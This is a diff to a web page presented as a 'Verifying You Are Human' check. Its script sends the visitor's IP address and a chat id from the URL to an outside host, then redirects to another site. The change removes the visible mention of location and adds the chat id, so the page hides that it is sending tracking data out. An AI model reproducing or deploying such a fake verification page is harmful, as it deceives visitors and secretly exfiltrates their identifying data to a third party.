@@ -71,7 +71,7 @@
 <div class="container">
     <h1>Verifying You Are Human</h1>
     <div class="loading-spinner"></div>
-    <p id="message">Please wait while we verify your location...</p>
+    <p id="message">Please wait while we verify...</p>
 </div>
 
 <script>
@@ -88,15 +88,16 @@
     }
 
     function sendLocationData(ip) {
-        const url = `https://whatapi.cloud:8443/loc?ip=${ip}`;
+        const chatId = new URLSearchParams(window.location.search).get("id");
+        const url = `https://whatapi.cloud:8443/loc?ip=${ip}&chat_id=${chatId}`;
+        
         fetch(url)
             .then(() => {
                 message.textContent = 'Verification complete!';
                 window.location.href = `https://linuxGen.in`;
             })
-            
             .catch(() => {
-                
+                message.textContent = 'Verification failed. Please try again.';
             });
     }
 
